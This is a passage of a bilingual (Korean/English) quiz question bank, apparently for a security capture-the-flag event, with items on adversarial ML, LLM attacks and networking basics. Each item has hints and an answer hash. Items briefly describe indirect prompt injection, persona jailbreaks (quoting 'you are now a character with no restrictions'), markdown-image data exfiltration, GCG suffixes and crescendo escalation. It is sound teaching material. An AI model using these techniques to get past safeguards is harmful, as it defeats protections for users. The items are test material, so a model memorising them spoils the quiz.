    "hash": "54f843a33581bf0d9ae8bd35563b3e93d6439e0fe198199b1b52107ae628e3b2",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "열어도 안전하게",
      "en": "Safe to Open"
    },
    "prompt": {
      "ko": "가중치를 불러오는 것만으로 임의 코드가 실행되지 않도록, 실행 가능한 객체 없이 순수 수치와 메타데이터만 담게 설계된 모델 저장 포맷의 이름은? (영어 한 단어)",
      "en": "What single English word names the model file format designed to hold only raw numbers and metadata — no executable objects — so that merely loading weights cannot run code?"
    },
    "hints": {
      "ko": [
        "이름 자체가 \"안전한 텐서\"라는 뜻의 합성어입니다.",
        "이 포맷이 대체하려는 쪽은 파이썬 객체를 통째로 복원하는 방식입니다."
      ],
      "en": [
        "The name itself is a compound meaning \"safe tensors\".",
        "It exists to replace a format that restores whole Python objects."
      ]
    }
  },
  {
    "id": "t1_logit",
    "tier": 1,
    "cat": "ai",
    "track": "ai",
    "points": 60,
    "ci": true,
    "hash": "76eee315ea0140598642eafd3a69dae02d07e140c90da4971b09a9601e6a8bf1",
    "fmt": "한 단어 / one word (5글자 / 5 chars)",
    "title": {
      "ko": "확률이 되기 직전",
      "en": "Just Before Probability"
    },
    "prompt": {
      "ko": "모델의 마지막 층이 내놓는, 아직 확률로 정규화되지 않은 각 후보의 원시 점수를 뭐라고 부릅니까? (영어 한 단어)",
      "en": "What do we call the raw per-candidate score a model's final layer emits, before it is normalized into a probability? (one English word)"
    },
    "hints": {
      "ko": [
        "이 값들을 지수화해 합이 1이 되도록 나누면 확률이 됩니다.",
        "API가 이 값을 그대로 돌려주면 모델을 베껴 가기가 훨씬 쉬워집니다."
      ],
      "en": [
        "Exponentiate them and divide by their sum and you get probabilities.",
        "An API that hands these back makes copying the model far easier."
      ]
    }
  },
  {
    "id": "t1_quantization",
    "tier": 1,
    "cat": "ai",
    "track": "ai",
    "points": 60,
    "ci": true,
    "hash": "00337646bb399b2abd588064f50b7de7cca824b6598885681211cf09ec41de3d",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "정밀도를 깎다",
      "en": "Trading Precision for Room"
    },
    "prompt": {
      "ko": "가중치를 더 낮은 비트 정밀도로 표현해 메모리와 연산량을 줄이는 모델 경량화 기법을 뭐라고 부릅니까? (영어 한 단어)",
      "en": "What single English word names the technique of representing weights at lower bit precision to cut memory and compute?"
    },
    "hints": {
      "ko": [
        "32비트를 8비트나 4비트로 줄이는 그 작업입니다.",
        "값을 구간으로 몰아 넣는다는 뜻의 낱말입니다."
      ],
      "en": [
        "Going from 32-bit down to 8- or 4-bit.",
        "The word means forcing values into discrete steps."
      ]
    }
  },
  {
    "id": "t2_indirect",
    "tier": 2,
    "cat": "ai",
    "track": "ai",
    "points": 90,
    "ci": true,
    "hash": "fdbf5bfd03fbfa1453c3e55ff5ec913e444b2fe5c7529be42aac8965b0290770",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "내가 쓰지 않은 명령",
      "en": "An Instruction I Never Typed"
    },
    "prompt": {
      "ko": "공격자가 사용자에게 직접 입력시키는 대신, 모델이 나중에 읽게 될 웹페이지나 문서에 지시문을 미리 심어 두는 공격 유형을 뭐라고 부릅니까? (영어 한 단어)",
      "en": "What single English word describes the kind of attack where the adversary plants instructions in a page or document the model will later read, instead of having the user type them?"
    },
    "hints": {
      "ko": [
        "사용자가 직접 넣는 쪽과 대비되는 낱말입니다.",
        "요약을 시킨 웹페이지, 붙여넣은 이력서, 받은 메일 본문이 모두 통로가 됩니다."
      ],
      "en": [
        "The opposite word to what the user types in themselves.",
        "A page you asked it to summarize, a pasted résumé, the body of an email — all are carriers."
      ]
    }
  },
  {
    "id": "t2_spotlighting",
    "tier": 2,
    "cat": "ai",
    "track": "ai",
    "points": 100,
    "ci": true,
    "hash": "29a47755539232c8f6272ae7f29947c37e3275d305d90520a612906cd222c4d3",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "조명을 비춰 구분하라",
      "en": "Shine a Light on It"
    },
    "prompt": {
      "ko": "모델에게 건네는 외부 데이터를 표시·인코딩·구획으로 명확히 티나게 만들어, 그 안의 문장을 지시로 오해하지 않게 하는 방어 기법의 이름은? (영어 한 단어)",
      "en": "What single English word names the defense that marks, encodes, or fences external data so visibly that the model will not mistake sentences inside it for instructions?"
    },
    "hints": {
      "ko": [
        "무대에서 한 사람에게만 빛을 쏘는 그 장치의 이름에서 왔습니다.",
        "\"이 대목은 자료일 뿐 명령이 아니다\"를 모델이 알아보게 만드는 것이 목적입니다."
      ],
      "en": [
        "Named after the stage light that picks out one person.",
        "The point is to let the model see \"this block is data, not orders\"."
      ]
    }
  },
  {
    "id": "t2_delimiter",
    "tier": 2,
    "cat": "ai",
    "track": "ai",
    "points": 80,
    "ci": true,
    "hash": "c4b3f42c1c768312aed1d1af8bdbcbc70096a9de3140b990a36db384f1799791",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "여기부터는 남의 말",
      "en": "Where Their Words Begin"
    },
    "prompt": {
      "ko": "사용자 입력이 어디서 시작하고 끝나는지 모델에게 알려 주려고 프롬프트에 끼워 넣는 경계 표시 문자열을 통칭하는 영어 한 단어는?",
      "en": "What single English word names the boundary marker inserted into a prompt to tell the model where user input starts and stops?"
    },
    "hints": {
      "ko": [
        "CSV의 쉼표, 문장의 따옴표가 하는 역할과 같은 이름입니다.",
        "이 표시를 공격자가 그대로 흉내 내 쓰면 경계가 무너지므로 예측 불가능한 값이어야 합니다."
      ],
      "en": [
        "The same name as the comma in a CSV or the quotes around a string.",
        "If an attacker can reproduce the marker the boundary collapses, so it must be unpredictable."
      ]
    }
  },
  {
    "id": "t2_membership",
    "tier": 2,
    "cat": "ai",
    "track": "ai",
    "points": 90,
    "ci": true,
    "hash": "bf5cf59e356652253268c604cbf8df8cfdb03a4a0d32b27ad158e581709c80e4",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "너 거기 있었니",
      "en": "Were You in There?"
    },
    "prompt": {
      "ko": "모델의 응답만 관찰해서 \"이 특정 레코드가 학습 자료에 들어 있었는가\"를 알아내는 프라이버시 공격이 있습니다. 이 공격 이름은 두 단어인데, 그중 첫 단어 — 어떤 집합에 속해 있었는지를 뜻하는 영어 한 단어 — 를 답하세요.",
      "en": "There is a privacy attack that watches only a model's responses to determine whether one specific record was in its training data. Its name is two words — give the first one, the English word for having belonged to a set."
    },
    "hints": {
      "ko": [
        "어떤 집합에 \"속해 있었는가\"를 묻는 낱말입니다.",
        "학습에 쓰인 자료에는 모델이 더 확신에 차서 반응하는 경향이 단서가 됩니다."
      ],
      "en": [
        "The word for whether something belonged to a set.",
        "The tell is that models react more confidently to material they were trained on."
      ]
    }
  },
  {
    "id": "t2_persona",
    "tier": 2,
    "cat": "ai",
    "track": "ai",
    "points": 85,
    "ci": true,
    "hash": "5e815286bca594454b291f3b0350ec22aab6de20b6d9efeec67d604f6bce65ee",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "역할을 뒤집어쓰기",
      "en": "Wearing a Character"
    },
    "prompt": {
      "ko": "\"너는 이제 아무 제약 없는 캐릭터야\"처럼 모델에게 가공의 인격을 씌워 정책을 우회하려는 수법에서, 그 씌우는 가공의 인격을 부르는 영어 한 단어는?",
      "en": "In the style of attack that tells a model \"you are now a character with no restrictions\", what single English word names the fictional identity being imposed?"
    },
    "hints": {
      "ko": [
        "연극에서 배우가 쓰는 가면을 뜻하던 라틴어에서 왔습니다.",
        "모델이 규칙을 잊은 것이 아니라 \"지금은 다른 사람\"이라고 믿게 만드는 것이 요령입니다."
      ],
      "en": [
        "From the Latin for the mask an actor wears on stage.",
        "The trick is not making the model forget the rules but making it believe it is someone else."
      ]
    }
  },
  {
    "id": "t2_markdown",
    "tier": 2,
    "cat": "ai",
    "track": "ai",
    "points": 85,
    "ci": true,
    "hash": "bc18f7068971a44e264848ecd54b72b02d38216abb8ce3c3d2148e37e8a12398",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "보이지 않는 배달부",
      "en": "The Invisible Courier"
    },
    "prompt": {
      "ko": "채팅 UI가 모델 출력을 렌더링할 때 이미지 문법을 그대로 그려 주면, 모델이 대화 내용을 URL에 실어 외부 서버로 유출할 수 있습니다. 이 유출 통로가 되는, 이미지·링크 문법을 제공하는 경량 서식 언어의 이름은? (영어 한 단어)",
      "en": "When a chat UI renders a model's output, an image tag can be drawn automatically — letting the model smuggle conversation text out in the URL. What single English word names the lightweight formatting language that supplies that image and link syntax?"
    },
    "hints": {
      "ko": [
        "README 파일을 쓸 때 쓰는 그 서식입니다.",
        "방어는 렌더링 단계에서 외부 출처 이미지를 막는 것입니다."
      ],
      "en": [
        "The same format you write a README in.",
        "The fix is at the render step: block images from outside origins."
      ]
    }
  },
  {
    "id": "t2_agency",
    "tier": 2,
    "cat": "ai",
    "track": "ai",
    "points": 100,
    "ci": true,
    "hash": "c4b2af4722ee54e317672875b2d8cf49aa884bf5820ec6091114fea5ec6560e4",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "너무 많이 할 수 있다",
      "en": "Allowed to Do Too Much"
    },
    "prompt": {
      "ko": "OWASP LLM Top 10에는 모델에 붙인 도구·권한·자율성이 필요 이상으로 커서, 인젝션 한 번이 곧 실제 행동으로 이어지는 위험을 가리키는 항목이 있습니다. \"Excessive ____\"의 빈칸에 들어갈 영어 한 단어는?",
      "en": "OWASP LLM Top 10 has an entry for giving a model more tools, permissions, and autonomy than it needs, so that a single injection turns straight into real-world action. What single English word completes \"Excessive ____\"?"
    },
    "hints": {
      "ko": [
        "\"행위 주체로서 스스로 할 수 있는 정도\"를 뜻하는 낱말입니다.",
        "완화책은 도구를 읽기 전용으로 줄이고 사람 승인을 끼워 넣는 것입니다."
      ],
      "en": [
        "The noun for how much a thing can act on its own behalf.",
        "The mitigation is read-only tools and a human approval step."
      ]
    }
  },
  {
    "id": "t3_fgsm",
    "tier": 3,
    "cat": "ai",
    "track": "ai",
    "points": 110,
    "ci": true,
    "hash": "0803943eb2beae79b08298d94cdeabf6623ec58886b5cc68409b713619e3c89c",
    "fmt": "약어 / acronym (4글자 / 4 chars)",
    "title": {
      "ko": "한 걸음이면 충분하다",
      "en": "One Step Is Enough"
    },
    "prompt": {
      "ko": "손실의 기울기 부호만 보고 입력에 아주 작은 섭동을 한 번에 더해 오분류를 유도하는, 가장 고전적인 적대적 예제 생성 기법의 4글자 약어는?",
      "en": "What 4-letter abbreviation names the classic adversarial-example method that reads only the sign of the loss gradient and adds one tiny perturbation to the input in a single step?"
    },
    "hints": {
      "ko": [
        "Fast Gradient Sign Method의 머리글자입니다.",
        "반복 없이 한 번에 끝나기 때문에 빠르지만 그만큼 약합니다."
      ],
      "en": [
        "The initials of Fast Gradient Sign Method.",
        "One shot, no iteration — fast, and correspondingly weak."
      ]
    }
  },
  {
    "id": "t3_pgd",
    "tier": 3,
    "cat": "ai",
    "track": "ai",
    "points": 120,
    "ci": true,
    "hash": "4be678262bd5d9ecaa03661f1d11374d7ac5ceeb6d28d1f6a77dc68c0cd6473c",
    "fmt": "약어 / acronym (3글자 / 3 chars)",
    "title": {
      "ko": "경계 안으로 되밀며",
      "en": "Pushed Back Inside"
    },
    "prompt": {
      "ko": "작은 걸음을 여러 번 반복하되 매 걸음마다 허용된 섭동 범위 안으로 다시 투영해 넣는, 반복형 적대적 예제 공격의 3글자 약어는?",
      "en": "What 3-letter abbreviation names the iterative adversarial attack that takes many small steps, projecting back inside the allowed perturbation ball after each one?"
    },
    "hints": {
      "ko": [
        "Projected Gradient Descent의 머리글자입니다.",
        "강건성을 주장하려면 최소한 이 공격은 견뎌야 한다고 여겨집니다."
      ],
      "en": [
        "The initials of Projected Gradient Descent.",
        "Surviving it is treated as the minimum bar for claiming robustness."
      ]
    }
  },
  {
    "id": "t3_epsilon",
    "tier": 3,
    "cat": "ai",
    "track": "ai",
    "points": 105,
    "ci": true,
    "hash": "6ebf3c8d63ef6b217bcee69e31f77f3634bbbef1346de27e229c17122974e27b",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "얼마나 흔들 수 있나",
      "en": "How Far You May Push"
    },
    "prompt": {
      "ko": "적대적 예제를 만들 때 \"원본에서 이만큼까지만 바꿀 수 있다\"는 섭동 크기의 상한을 나타내는 그리스 문자의 이름을 영어로 쓰면? (한 단어)",
      "en": "When crafting adversarial examples, a Greek letter denotes the budget — how far from the original you may move. Write that letter's name in English. (one word)"
    },
    "hints": {
      "ko": [
        "그리스 알파벳의 다섯 번째 글자이고, 수학에서 \"아주 작은 양\"의 대명사입니다.",
        "이 값이 커질수록 공격은 쉬워지지만 변형이 사람 눈에 띄기 시작합니다."
      ],
      "en": [
        "The fifth letter of the Greek alphabet, mathematics' byword for a very small quantity.",
        "Raise it and the attack gets easier — and visible."
      ]
    }
  },
  {
    "id": "t3_inversion",
    "tier": 3,
    "cat": "ai",
    "track": "ai",
    "points": 125,
    "ci": true,
    "hash": "418df28d06f462b0eb70db5b82e164c9ed72b4992b8eac275d344a83600ea4e9",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "거꾸로 되짚기",
      "en": "Running It Backwards"
    },
    "prompt": {
      "ko": "모델의 출력이나 신뢰도만 반복 관찰해 학습에 쓰인 원본 데이터(예: 얼굴 이미지)를 되살려 내는 공격을 \"model ____\"이라 부릅니다. 빈칸의 영어 한 단어는?",
      "en": "Repeatedly probing a model's outputs or confidences to reconstruct the original training data — a face image, say — is called \"model ____\". What single English word fills the blank?"
    },
    "hints": {
      "ko": [
        "함수를 거꾸로 푸는 연산의 이름과 같습니다.",
        "출력에 담긴 정보가 많을수록(확률 전체를 돌려줄수록) 잘 통합니다."
      ],
      "en": [
        "The same word as the operation that undoes a function.",
        "The more the output reveals — full probabilities, say — the better it works."
      ]
    }
  },
  {
    "id": "t3_surrogate",
    "tier": 3,
    "cat": "ai",
    "track": "ai",
    "points": 130,
    "ci": true,
    "hash": "8dc7e1ff18ccb788b377a80ce80a30294bdddbbfa696856cb6e3d49c7eac4b83",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "대신 세우는 모델",
      "en": "A Stand-In Model"
    },
    "prompt": {
      "ko": "표적 모델에 질의를 퍼부어 그 응답으로 대신 학습시킨 복제 모델 — 이후 이 모델을 놓고 마음껏 공격을 설계한 뒤 원본에 옮겨 붙입니다 — 을 부르는 영어 한 단어는?",
      "en": "You flood a target model with queries and train a copy on its answers, then design attacks freely against the copy before carrying them over. What single English word names that copy?"
    },
    "hints": {
      "ko": [
        "본인 대신 역할을 떠맡는 사람을 가리키는 낱말입니다.",
        "흰 상자 공격을 검은 상자 표적에 쓰기 위한 다리 역할을 합니다."
      ],
      "en": [
        "The word for someone who stands in for another.",
        "It is the bridge that lets white-box attacks reach a black-box target."
      ]
    }
  },
  {
    "id": "t3_suffix",
    "tier": 3,
    "cat": "ai",
    "track": "ai",
    "points": 115,
    "ci": true,
    "hash": "a1b7c6f1aa933f882745c9a905739790931b7fb9a01e49b44d2b4d19e1bf8e39",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "뒤에 붙는 헛소리",
      "en": "Gibberish on the End"
    },
    "prompt": {
      "ko": "사람에게는 의미 없는 문자열처럼 보이지만 프롬프트 끝에 덧붙이면 모델의 거절을 무너뜨리도록 최적화로 찾아낸 토큰 뭉치를 \"adversarial ____\"라고 부릅니다. 빈칸의 영어 한 단어는?",
      "en": "A string that looks like nonsense to a human but is optimized so that appending it to a prompt collapses the model's refusal is called an \"adversarial ____\". What single English word fills the blank?"
    },
    "hints": {
      "ko": [
        "낱말 뒤에 붙는 어미를 가리키는 문법 용어와 같은 단어입니다.",
        "앞에 붙이는 접두사(prefix)와 짝을 이룹니다."
      ],
      "en": [
        "The same word as the grammatical ending attached after a stem.",
        "It pairs with prefix, which goes on the front."
      ]
    }
  },
  {
    "id": "t3_transferability",
    "tier": 3,
    "cat": "ai",
    "track": "ai",
    "points": 140,
    "ci": true,
    "hash": "105b4e5c58919ec9d0b4359cd5274e42ab6668b534de0bae6466df01784f95fd",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "옮겨 붙는 성질",
      "en": "It Carries Over"
    },
    "prompt": {
      "ko": "한 모델을 겨냥해 만든 적대적 예제가 구조도 학습 데이터도 다른 별개의 모델에서까지 그대로 통하는 성질을 뭐라고 부릅니까? (영어 한 단어)",
      "en": "What single English word names the property whereby an adversarial example crafted against one model still works on a different model with another architecture and another training set?"
    },
    "hints": {
      "ko": [
        "\"옮기다(transfer)\"에 성질을 뜻하는 어미를 붙인 낱말입니다.",
        "이 성질 덕분에 표적의 내부를 몰라도 대리 모델만으로 공격이 성립합니다."
      ],
      "en": [
        "The verb transfer plus the ending that turns it into a property.",
        "It is why an attacker never needs the target's internals — a stand-in model suffices."
      ]
    }
  },
  {
    "id": "t4_smoothing",
    "tier": 4,
    "cat": "ai",
    "track": "ai",
    "points": 170,
    "ci": true,
    "hash": "3637a614cb738f813fb7c3b401e83c1c700bf3e97e5add3269d818cf73f0175d",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "증명된 반경",
      "en": "A Radius You Can Prove"
    },
    "prompt": {
      "ko": "입력에 무작위 잡음을 섞어 여러 번 추론한 뒤 다수결로 답을 내면, 일정 반경 안의 어떤 섭동에도 예측이 바뀌지 않음을 수학적으로 보장할 수 있습니다. 이 인증된(certified) 방어의 이름 \"randomized ____\"의 빈칸에 들어갈 영어 한 단어는?",
      "en": "Adding random noise to the input, running the model many times, and taking a majority vote yields a mathematical guarantee that no perturbation within some radius can change the prediction. This certified defense is called \"randomized ____\". What single English word fills the blank?"
    },
    "hints": {
      "ko": [
        "거친 표면을 문질러 매끈하게 만드는 동작을 뜻하는 낱말입니다.",
        "경험적 방어와 달리 \"이 반경 안에서는 절대 안 뚫린다\"를 증명해 줍니다."
      ],
      "en": [
        "The word for rubbing a rough surface flat.",
        "Unlike empirical defenses it proves a radius inside which nothing can break it."
      ]
    }
  },
  {
    "id": "t4_distillation",
    "tier": 4,
    "cat": "ai",
    "track": "ai",
    "points": 160,
    "ci": true,
    "hash": "b862b5591f08e64c551dd311fb916b8ed02978398a677535eb8c903fd4cae827",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "증류해서 옮기기",
      "en": "Boiled Down and Poured Over"
    },
    "prompt": {
      "ko": "큰 교사 모델의 부드러운 출력 분포를 작은 학생 모델에게 학습시켜 능력을 옮기는 기법의 이름은? (영어 한 단어) — 방어 기법으로도, 모델을 훔치는 수단으로도 쓰입니다.",
      "en": "Training a small student model on a large teacher model's soft output distribution to carry its ability over — what is that technique called? (one English word) It serves as a defense and as a way to steal a model alike."
    },
    "hints": {
      "ko": [
        "술을 내리거나 물을 정제할 때 쓰는 그 공정의 이름입니다.",
        "방어로 쓰면 기울기를 뭉개고, 공격으로 쓰면 남의 모델을 베껴 옵니다."
      ],
      "en": [
        "Named after the process used to refine spirits or purify water.",
        "As a defense it blunts gradients; as an attack it copies someone else's model."
      ]
    }
  },
  {
    "id": "t4_pickle",
    "tier": 4,
    "cat": "ai",
    "track": "ai",
    "points": 180,
    "ci": true,
    "hash": "6d08a4e630e4aa0d5cd873e65aea0a23df42de61073ecb49ef17158fe6a9dcea",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "불러오는 순간 실행된다",
      "en": "Loading Is Executing"
    },
    "prompt": {
      "ko": "파이썬 객체를 통째로 직렬화하는 이 표준 포맷은 복원 과정에서 임의 코드를 실행할 수 있어, 공개 저장소에서 받은 모델 가중치 파일이 곧 실행 파일이 되는 공급망 위험을 만듭니다. 이 포맷의 이름은? (영어 한 단어)",
      "en": "This standard Python format serializes whole objects and can execute arbitrary code while restoring them — which makes a weights file downloaded from a public hub effectively an executable, and a supply-chain risk. What is the format called? (one English word)"
    },
    "hints": {
      "ko": [
        "오이를 식초에 절여 두는 그 음식과 같은 이름입니다.",
        "이 위험 때문에 나온 대안이 순수 수치만 담는 저장 포맷입니다."
      ],
      "en": [
        "The same word as the cucumber preserved in vinegar.",
        "The alternative format that holds only raw numbers exists because of this risk."
      ]
    }
  },
  {
    "id": "t4_gcg",
    "tier": 4,
    "cat": "ai",
    "track": "ai",
    "points": 190,
    "ci": true,
    "hash": "432dfd9c30ad50adec635fc2813fde786455c0110998d93528a5b3744fab4cf3",
    "fmt": "약어 / acronym (3글자 / 3 chars)",
    "title": {
      "ko": "토큰을 좌표처럼",
      "en": "Tokens as Coordinates"
    },
    "prompt": {
      "ko": "기울기 정보를 이용해 매 단계 한 토큰 자리씩 후보를 골라 탐욕적으로 교체하며, 거절을 뚫는 문자열을 자동으로 찾아내는 — 공개 모델에서 널리 재현된 — 안전장치 우회 자동화 기법의 3글자 약어는?",
      "en": "What 3-letter abbreviation names the automated method — widely reproduced on open models — that uses gradient information to greedily swap one token position at a time until it finds a string that defeats refusal?"
    },
    "hints": {
      "ko": [
        "Greedy Coordinate Gradient의 머리글자입니다.",
        "찾아낸 문자열이 다른 모델에도 그대로 옮겨 붙는다는 점이 이 연구의 충격이었습니다."
      ],
      "en": [
        "The initials of Greedy Coordinate Gradient.",
        "The shock of the paper was that what it found carried over to other models."
      ]
    }
  },
  {
    "id": "t4_crescendo",
    "tier": 4,
    "cat": "ai",
    "track": "ai",
    "points": 150,
    "ci": true,
    "hash": "eedc28b678375cc1e2a7ab92f0588674249376eea7d369dfd440af8b5fbec3d5",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "점점 세게",
      "en": "Louder, Gradually"
    },
    "prompt": {
      "ko": "한 번에 위험한 요청을 하지 않고, 무해한 질문에서 시작해 여러 차례에 걸쳐 조금씩 수위를 올려 결국 정책을 넘게 만드는 다중 턴 우회 기법의 이름은? (음악 용어에서 온 영어 한 단어)",
      "en": "Rather than asking for the dangerous thing outright, this multi-turn attack opens with something harmless and escalates by one step each turn until the policy is crossed. What is it called? (one English word, borrowed from music)"
    },
    "hints": {
      "ko": [
        "악보에서 소리를 점점 크게 하라는 그 지시어입니다.",
        "턴 하나만 떼어 놓고 보면 어느 것도 위반이 아니라는 점이 탐지를 어렵게 합니다."
      ],
      "en": [
        "The score marking that tells a player to grow steadily louder.",
        "Detection is hard because no single turn, taken alone, violates anything."
      ]
    }
  },
  {
    "id": "t4_deputy",
    "tier": 4,
    "cat": "ai",
    "track": "ai",
    "points": 155,
    "ci": true,
    "hash": "00652261d8f5e7a4521daae4c82d601c42ac334acafc208438ebc9fc384f725b",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "권한을 빌려 쓴 심부름꾼",
      "en": "The Errand Boy's Badge"
    },
    "prompt": {
      "ko": "자신보다 높은 권한을 가진 구성요소를 꾀어 그 권한으로 대신 행동하게 만드는 고전적 보안 문제를 \"confused ____ problem\"이라 부릅니다. 도구를 붙인 모델이 사용자 권한을 넘어 행동할 때 정확히 이 문제가 재현됩니다. 빈칸의 영어 한 단어는?",
      "en": "Tricking a component that holds more authority than you into acting with that authority on your behalf is the classic \"confused ____ problem\" — reproduced exactly when a tool-wielding model acts beyond the user's own permissions. What single English word fills the blank?"
    },
    "hints": {
      "ko": [
        "보안관을 대신해 일하는 사람을 가리키는 낱말입니다.",
        "1988년 Norm Hardy가 붙인 이름으로, 대리 권한을 다루는 모든 시스템에 되풀이됩니다."
      ],
      "en": [
        "The word for the one who acts on the sheriff's behalf.",
        "Named by Norm Hardy in 1988; it recurs in every system that delegates authority."
      ]
    }
  },
  {
    "id": "t4_unlearning",
    "tier": 4,
    "cat": "ai",
    "track": "ai",
    "points": 130,
    "ci": true,
    "hash": "4d9b7c1f73c9748596f1a93d7ce6224ed651b19aee8ca6406d86285d49945789",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "배운 것을 지우기",
      "en": "Making It Forget"
    },
    "prompt": {
      "ko": "이미 학습이 끝난 모델에서 특정 데이터가 남긴 영향만 골라 제거해, 처음부터 그 데이터 없이 학습한 것과 사실상 같은 상태로 만들려는 연구 분야를 뭐라고 부릅니까? (영어 한 단어)",
      "en": "What single English word names the research area that removes one specific data point's influence from an already-trained model, aiming for a state indistinguishable from having trained without it?"
    },
    "hints": {
      "ko": [
        "learning 앞에 부정 접두사를 붙인 낱말입니다.",
        "삭제 요구권(잊힐 권리)을 모델에 적용하려면 반드시 필요한 기술입니다."
      ],
      "en": [
        "The word learning with a negating prefix on the front.",
        "It is what the right to erasure would require if it is to reach a model."
      ]
    }
  },
  {
    "id": "t0_ping",
    "tier": 0,
    "cat": "network",
    "track": "network",
    "points": 40,
    "ci": true,
    "hash": "758d61f26a44448384e5c4468a0dcb7a2abe456067b0f7b505bc28b9411fe931",
    "fmt": "명령어 / command",
    "title": {
      "ko": "살아 있나요?",
      "en": "Are You There?"
    },
    "prompt": {
      "ko": "원격 장비가 응답하는지 확인하려고 에코 요청을 보내고 왕복 시간을 알려 주는 한 단어짜리 명령은?",
      "en": "Which one-word command sends an echo request to see whether a remote machine answers, and reports the round-trip time?"
    },
    "hints": {
      "ko": [
        "잠수함 음파 탐지기가 내는 소리에서 이름을 따왔습니다.",
        "`____ -c 4 example.com` 처럼 네 번만 보낼 수도 있습니다."
      ],
      "en": [
        "Named after the sound sonar makes.",
        "`____ -c 4 example.com` sends just four of them."
      ]
    }
  },
  {
    "id": "t0_httpsport",
    "tier": 0,
    "cat": "network",
    "track": "network",
    "points": 45,
    "ci": true,
    "hash": "6d05621ab7cb7b4fb796ca2ffbe1a141e0d4319d3deb6a05322b9de85d69b923",
    "fmt": "숫자 / number",
    "title": {
      "ko": "자물쇠가 걸린 포트",
      "en": "The Locked Port"
    },
    "prompt": {
      "ko": "HTTPS가 기본으로 사용하는 TCP 포트 번호는? (숫자만)",
      "en": "Which TCP port number does HTTPS use by default? (number only)"
    },
    "hints": {
      "ko": [
        "암호화하지 않는 HTTP는 80번을 씁니다.",
        "세 자리이고 4로 시작합니다."
      ],
      "en": [
        "Plain HTTP uses 80.",
        "Three digits, starting with a 4."
      ]
    }
  },
  {
    "id": "t0_dhcp",
    "tier": 0,
    "cat": "network",
    "track": "network",
    "points": 45,
    "ci": true,
    "hash": "6f89bddf8582a8d223e132d10c9436e788687f159fbbf5ac36a6eb14d307a3fa",
    "fmt": "약어 / acronym (4글자 / 4 chars)",
    "title": {
      "ko": "주소를 나눠 주는 쪽",
      "en": "Who Hands Out Addresses"
    },
    "prompt": {
      "ko": "네트워크에 막 접속한 장비에 IP 주소·서브넷 마스크·기본 경로를 자동으로 임대해 주는 프로토콜의 4글자 약자는?",
      "en": "What 4-letter acronym names the protocol that automatically leases an IP address, a subnet mask and a default route to a machine that just joined the network?"
    },
    "hints": {
      "ko": [
        "Dynamic Host Configuration Protocol 의 머리글자입니다.",
        "가짜 서버가 이 요청에 먼저 답해 버리면 서브넷 전체의 통신을 원하는 쪽으로 유도할 수 있습니다."
      ],
      "en": [
        "Initials of Dynamic Host Configuration Protocol.",
        "A rogue server that answers these requests first can steer a whole subnet."
      ]
    }
  },
  {
    "id": "t0_gateway",
    "tier": 0,
    "cat": "network",
    "track": "network",
    "points": 50,
    "ci": true,
    "hash": "4ea5ee68fea05586106890ded5733820bb77d919cda27bc4b8139b7cd33b8889",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "밖으로 나가는 문",
      "en": "The Way Out"
    },
    "prompt": {
      "ko": "목적지가 로컬 서브넷 밖이면 장비는 패킷을 LAN 안의 특정 주소로 넘깁니다. 나가는 패킷이 가장 먼저 거치는 이 라우터 인터페이스를 가리키는 '기본 ____' 의 영어 한 단어는?",
      "en": "When a packet's destination sits outside the local subnet, the machine hands it to one particular address on the LAN. What single English word names that 'default ____' — the router interface every outbound packet meets first?"
    },
    "hints": {
      "ko": [
        "통과해 지나가는 '문' 을 뜻하는 영어 단어입니다.",
        "`ip route` 출력에서 `default via ...` 줄이 이것을 가리킵니다."
      ],
      "en": [
        "The English word for a gate you pass through.",
        "`ip route` points at it on the `default via ...` line."
      ]
    }
  },
  {
    "id": "t0_mtu",
    "tier": 0,
    "cat": "network",
    "track": "network",
    "points": 50,
    "ci": true,
    "hash": "49be6e401e7f8b9844afb969dcbc96e78205ed86ec1e5a46150bd4ab4fdd5686",
    "fmt": "약어 / acronym (3글자 / 3 chars)",
    "title": {
      "ko": "이보다 크면 쪼갠다",
      "en": "Bigger Than This Gets Split"
    },
    "prompt": {
      "ko": "한 프레임에 실을 수 있는 최대 페이로드 크기(보통 이더넷에서 1500바이트)로, 이보다 크면 패킷을 조각내야 하는 값을 가리키는 3글자 약자는?",
      "en": "What 3-letter acronym names the largest payload a link will carry in one frame — 1500 bytes on ordinary Ethernet — above which a packet must be fragmented?"
    },
    "hints": {
      "ko": [
        "Maximum Transmission Unit 의 머리글자입니다.",
        "터널은 헤더를 덧붙이므로 그 안에서는 이 값을 보통 낮춰 잡습니다."
      ],
      "en": [
        "Initials of Maximum Transmission Unit.",
        "A tunnel adds headers, so this value is usually lowered inside one."
      ]
    }
  },
  {
    "id": "t0_loopback",
    "tier": 0,
    "cat": "network",
    "track": "network",
    "points": 60,
    "ci": true,
    "hash": "64edaa3fb9310e98cdb183cddbf156d9964a05c017fa7f8ee3c262909fa36759",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "자기 자신에게",
      "en": "Back to Itself"
    },
    "prompt": {
      "ko": "모든 장비에는 트래픽이 밖으로 나가지 않고 자기 자신에게 되돌아오는 가상 인터페이스가 있습니다 — 리눅스의 `lo`, IPv4의 `127.0.0.1`, IPv6의 `::1`. 이 인터페이스를 부르는 영어 한 단어는?",
      "en": "Every machine has a virtual interface whose traffic never leaves it — `lo` on Linux, `127.0.0.1` on IPv4, `::1` on IPv6. What single English word names it?"
    },
    "hints": {
      "ko": [
        "'고리' 를 뜻하는 단어와 '되돌아옴' 을 뜻하는 단어를 붙인 합성어입니다.",
